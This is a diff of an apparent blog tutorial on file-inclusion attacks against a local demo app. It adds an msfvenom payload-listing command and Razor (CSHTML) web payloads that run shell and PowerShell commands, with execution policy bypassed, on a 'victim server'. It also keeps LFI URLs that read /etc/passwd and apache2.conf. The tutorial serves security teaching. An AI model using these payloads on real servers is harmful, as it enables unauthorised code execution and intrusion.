@@ -167,7 +167,12 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 <li class="toc-entry toc-h3"><a href="#page-parameter">Page Parameter</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#etcpasswd">/etc/passwd</a></li>
-<li class="toc-entry toc-h4"><a href="#not-included-in-demo-code">Not included in demo code</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h3"><a href="#not-included-in-demo-code">Not included in demo code</a></li>
+<li class="toc-entry toc-h3"><a href="#further-payloads">Further payloads</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#msfvenom">msfvenom</a></li>
 </ul>
 </li>
 <li class="toc-entry toc-h3"><a href="#faulty-code">Faulty Code</a></li>
@@ -203,7 +208,12 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
 <li class="toc-entry toc-h4"><a href="#test-parameter">Test Parameter</a>
 <ul>
 <li class="toc-entry toc-h5"><a href="#sanity-check-lfi-2">Sanity check lfi</a></li>
-<li class="toc-entry toc-h5"><a href="#getting-remote-code-execution-2">Getting remote code execution</a></li>
+<li class="toc-entry toc-h5"><a href="#getting-remote-code-execution-2">Getting remote code execution</a>
+<ul>
+<li class="toc-entry toc-h6"><a href="#list-directory">List directory</a></li>
+<li class="toc-entry toc-h6"><a href="#powershell-version">powershell version</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -221,7 +231,7 @@ style="background-image:url('/blog/assets/img/home-matrix.png')"
         <div class="row">
             <div class="col-lg-8 col-md-10 mx-auto">
 
-                <button type="button" id="sidebarCollapse" class="btn btn-outline-primary btn-lg btn-block">
+                <button type="button" id="sidebarCollapse" class="btn btn-primary-sm btn btn-block">
                     <i class="fas fa-align-left"></i>
                     <span>Toggle Table of Contents</span>
                 </button>
@@ -1068,6 +1078,9 @@ This key-value-pair consists a file as value.
 </p>
       <p class="card-text">
 This indicates a local-file-inclusion vulnerability. Search another html file of the application and try to insert it at the value position.
+</p>
+      <p class="card-text">
+<br>
 </p>
     </div>
   </div>
@@ -2645,8 +2658,8 @@ if you have already uploaded check.php:</p>
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/php_read_etc_passwd_rel.png" alt="PHP Read /etc/passwd relatively" width="100%"></p>
 
-<h4 id="not-included-in-demo-code">
-<a id="not-included-in-demo-code" class="anchor" href="#not-included-in-demo-code" aria-hidden="true"><span class="octicon octicon-link"></span></a>Not included in demo code</h4>
+<h3 id="not-included-in-demo-code">
+<a id="not-included-in-demo-code" class="anchor" href="#not-included-in-demo-code" aria-hidden="true"><span class="octicon octicon-link"></span></a>Not included in demo code</h3>
 
 <p>The following topic is not included in the demo code: <strong>Null Byte Injection in PHP</strong>.</p>
 
@@ -2666,6 +2679,22 @@ if you have already uploaded check.php:</p>
 
 <p>However, the use of zero bytes is no longer possible since <a href="https://secure.php.net/manual/en/security.filesystem.nullbytes.php">PHP version 5.3</a>.
 So this attack isn’t possible any more since then.</p>
+
+<h3 id="further-payloads">
+<a id="further-payloads" class="anchor" href="#further-payloads" aria-hidden="true"><span class="octicon octicon-link"></span></a>Further payloads</h3>
+
+<h4 id="msfvenom">
+<a id="msfvenom" class="anchor" href="#msfvenom" aria-hidden="true"><span class="octicon octicon-link"></span></a>msfvenom</h4>
+
+<p>There are a lot more payloads that are possible.</p>
+
+<p>To get an idea you can use the payload generator <strong>msfvenom</strong>.</p>
+
+<pre><code class="bash">msfvenom -l payloads | grep -i php</code></pre>
+
+<p><img src="/blog/assets/img/payload-tester/lfirfi/php_payloads_msfvenom.png" alt="PHP payloads msfvenom" width="100%"></p>
+
+<p>msfvenom is part of <a href="https://www.metasploit.com/">metasploit</a> which is itself is integrated in the Linux Distribution <a href="https://www.kali.org/">Kali</a>.</p>
 
 <h3 id="faulty-code">
 <a id="faulty-code" class="anchor" href="#faulty-code" aria-hidden="true"><span class="octicon octicon-link"></span></a>Faulty Code</h3>
@@ -2841,9 +2870,7 @@ if(name != null &amp;&amp; name.length() &gt; 0) {
 
 <p><img src="/blog/assets/img/payload-tester/lfirfi/jsp_ip_attackerserver.png" alt="JSP Final Remote Code Execution" width="100%"></p>
 
-<p>The following code is generated with <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>.</p>
-
-<p>msfvenom is part of <a href="https://www.metasploit.com/">metasploit</a> which is itself is integrated in the Linux Distribution <a href="https://www.kali.org/">Kali</a>.</p>
+<p>The following code is generated with <a href="#msfvenom">msfvenom</a>.</p>
 
 <p>You can use Kali if you have installed a Kali VM
 or have the OS at your hands otherwise.</p>
@@ -3021,6 +3048,9 @@ The attack would be:
       <p class="card-text">
 <a href="http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf">http://127.0.0.1:8883/lfi.php?page=/etc/apache2/apache2.conf</a> 
 </p>
+      <p class="card-text">
+<br>
+</p>
     </div>
   </div>
 </div>
@@ -3197,6 +3227,136 @@ otherwise you will get an error like the following:</p>
 
 <h5 id="getting-remote-code-execution-2">
 <a id="getting-remote-code-execution-2" class="anchor" href="#getting-remote-code-execution-2" aria-hidden="true"><span class="octicon octicon-link"></span></a>Getting remote code execution</h5>
+
+<h6 id="list-directory">
+<a id="list-directory" class="anchor" href="#list-directory" aria-hidden="true"><span class="octicon octicon-link"></span></a>List directory</h6>
+
+<p>Now let’s go one step further and try to execute shell commands.</p>
+
+<p>For this you can use the following code:</p>
+
+<pre><code class="DOS.bat">type WinLfiPayload.cshtml</code></pre>
+<pre><code class="C#">@using System.Diagnostics
+@{
+
+    var proc = new Process
+    {
+        StartInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c dir",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        }
+    };
+
+    proc.Start();
+    string line = "";
+    while (!proc.StandardOutput.EndOfStream)
+    {
+        line = line + proc.StandardOutput.ReadLine() + "&lt;br&gt;";
+    }
+    ViewData["Cmdout"] = line;
+}
+</code></pre>
+
+<pre><code class="C#">@Html.Raw(@ViewData["Cmdout"])
+</code></pre>
+
+<p>If you look at the lines with</p>
+
+<pre><code class="C#">FileName = "cmd.exe",
+Arguments = "/c dir",
+</code></pre>
+
+<p>you see that this CSHTML-File will execute a Windows Command:</p>
+
+<pre><code class="DOS.bat">cmd.exe /c dir
+</code></pre>
+
+<p>If you have a Linux Server running dotnet you can change this code for example to the Linux equivalent:</p>
+
+<pre><code class="bash">ls
+</code></pre>
+
+<p>Then the code would look like:</p>
+
+<pre><code class="bash">cat LinuxLfiPayload.cshtml</code></pre>
+<pre><code class="C#">@using System.Diagnostics
+@{
+
+    var proc = new Process
+    {
+        StartInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "ls",
+            Arguments = "",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        }
+    };
+
+    proc.Start();
+    string line = "";
+    while (!proc.StandardOutput.EndOfStream)
+    {
+        line = line + proc.StandardOutput.ReadLine() + "&lt;br&gt;";
+    }
+    ViewData["Cmdout"] = line;
+}
+
+@Html.Raw(@ViewData["Cmdout"])
+</code></pre>
+
+<h6 id="powershell-version">
+<a id="powershell-version" class="anchor" href="#powershell-version" aria-hidden="true"><span class="octicon octicon-link"></span></a>powershell version</h6>
+
+<p>Now let’s try to see if we have powershell on the system.</p>
+
+<p>We use the command:</p>
+
+<pre><code class="DOS.bat">powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(get-host).version | format-list -property *"
+</code></pre>
+
+<p>So the code will be:</p>
+
+<pre><code class="DOS.bat">type CheckPowerShell.cshtml
+</code></pre>
+
+<pre><code class="C#">@using System.Diagnostics
+@{
+
+    var proc = new Process
+    {
+        StartInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command \"(get-host).version | format-list -property *\"",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        }
+    };
+
+    proc.Start();
+    string line = "";
+    while (!proc.StandardOutput.EndOfStream)
+    {
+        line = line + proc.StandardOutput.ReadLine() + "&lt;br&gt;";
+    }
+    ViewData["Cmdout"] = line;
+}
+
+@Html.Raw(@ViewData["Cmdout"])
+</code></pre>
+
+<p>The output is:</p>
+
+<p><img src="/blog/assets/img/payload-tester/lfirfi/asp_powershell_check.png" alt="ASP Powershell Check" width="100%"></p>
+
+<p>Splendid! This means we can execute powershell commands on the victim server.</p>
 
 <h1 id="mitigation">
 <a id="mitigation" class="anchor" href="#mitigation" aria-hidden="true"><span class="octicon octicon-link"></span></a>Mitigation</h1>
